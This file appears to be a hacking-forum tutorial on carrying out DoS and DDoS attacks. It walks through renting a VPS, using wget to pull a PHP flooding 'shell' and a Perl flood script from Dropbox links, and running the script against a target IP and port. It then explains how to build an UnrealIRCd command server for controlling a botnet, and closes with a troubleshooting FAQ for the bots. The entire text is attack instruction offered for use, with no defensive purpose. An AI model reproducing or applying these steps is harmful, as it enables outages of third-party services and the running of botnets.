@@ -1,0 +1,121 @@
+What is DOS, what is DDOS, an what is the difference?
+DOS, denial of service, is an attack which causes a host to deny service. This is an attack from one machine. Generally these are not very successful or useful unless an exploit is used.
+
+DDOS, distributed denial of service, again, is an attack which cause a host to deny service. However, as the name would suggest, this attack is distributed, meaning more than one machine is used to attack. Of the two methods, DDOS tends to be much more effective, unless a VPS is used (discussed later)
+
+Now that you know what you're talking about, you're probably wondering how can I execute one of these attacks?
+There are several ways you can execute a DDOS attack. The most common are:
+
+1. Php shells
+2. VPS (virtual private server) with a dos script.
+3. Botnet
+4. *NIX Botnet
+
+[Image: 0u8Xa.png]
+
+What is a PHP shell?
+A php shell is a php script hosted on a web server, used for dos. When several php shells are used at once, you are able to make a DDOS attack.
+Now you may ask, how do I make a shell?
+A shell is created by hosting a shell on a vps.
+First, you would go to 2host.com and buy a vps. Choose CentOS 5 as your operating system.
+Once you have received your vps, you would execute these commands.
+Code:
+yum install httpd
+yum install php
+What you have just done is installed a web server Onto your vps.
+Then type:
+Code:
+cd /var/www/html
+Now upload your php shell.
+wget http://dl.dropbox.com/u/49537050/index.php
+Now, start your http server, as your shell is ready to use.
+Type:
+Code:
+service httpd start
+Next go into your web browser and navigate to [your vps ip]/index.php
+
+Now, if you've been paying attention, you're probably thinking "wait, this is only one host, I thought you said this was DDOS?"
+Well, do this several times on multiple different vps's, and hook them up using prodigies web booster source, and it is DDOS. Sorry, I will not be providing a tutorial for this. (if I forget to provide a link, remind me to post one)
+
+[Image: xOTmY.png]
+
+The setup for thi will be very similar to that of the shell. After buying your vps, you will execute this command:
+
+Code:
+yum install perl
+Next:
+
+Code:
+wget http://dl.dropbox.com/u/49537050/super.pl
+(script courtesy ItsFluffy)
+The script can be executed by using
+Code:
+perl super.pl [IP] [PORT] 65500 [TIME IN SECONDS]
+Again this is only a dos attack, however, you can set up multiple of these and use my tutorial to use multiple of these and create a DDOS attack.
+
+[Image: 1r3Vy.png]
+
+First, to clear up some confusion, I'm going to clea up some terminology.
+Bot: software used to infect/control a large amount of computers, or a computer infected with such software.
+
+Botnet: a collection of bots. Made up of two or more bots.
+
+Using the word incorrectly just makes it harder for other users to help you.
+
+[Image: TADtO.png]
+
+When using an irc bot, your irc server is what you use to control your bots. I'll be showing you how to set one of these up.
+
+1. Upload the unreal files to your vps
+2. Upload config file http://db.tt/g4sUPLdT
+3. Edit the config file. Replace "YOUR PASSWORD" with your desired password and "YOUR IP" with your vps's ip.
+[Image: jqze3oZmkxJjb.jpg][Image: jg9mFkArtjSe2.jpg]
+
+4. Type these commands in
+
+yum install gcc
+yum install zlib
+yum install OpenSSL
+yum install OpenSSL-devel
+ulimit -n 16384
+
+4b. Type vi /etc/security/limits.conf
+
+Scroll down to the bottom of the file and press I
+Add this to the end of the file
+root hard nofile 16384
+root soft nofile 16384
+
+5. Cd into the folder that contains your unrealircd files
+
+6. Type ./Config
+If it says permission denied, type chmod +x Config
+
+7. Press enter until you see a setting about SSL. Input yes, and leave the location blank.
+
+8. Afterwards, keep pressing enter until a setting involving zip links is reached. Choose yes. Again, leave the location blank.
+
+8b. For the last setting, make the number of sockets 16384
+
+9. After all of this is done, type make
+
+10. After it finishes compiling, type
+./unreal start
+
+11. Open up mIRC.
+12. Click select server. Add, put whatever in the description, and for IRC server, put your vps's ip. Leave group and password blank. 
+
+13. Join this newly created server. 
+
+14. To make yourself op, type: /oper oper [the password in your config file]
+
+
+
+FAQS
+
+Q: My HTTP bot is set up seemingly corectly, but it still doesnt work, what do I do?
+A: Make sure all of the files' permissions are set to 777. Also, this may seem stupid, but make sure that the MySQL user has been added to the database.
+Q: My bot's aren't responding to commands on my IRC server, what's wrong?
+A: Most IRC bots use a form of authentication via your hostname. For the bot respond to commands, you must have a certain hostname. This is set when you built your bot. You sould set your host by doing /sethost [the host that you set during build]. In addition, make sure you are using the correct comand prefix.
+Q: When I try to do "yum install httpd" it says that the command doesnt exist.
+A: You are probably using the wrong OS, most likely Ubuntu or Debian. Be sure to install CentOS. If you have a SolusVM control panel, you are able to switch your operating system
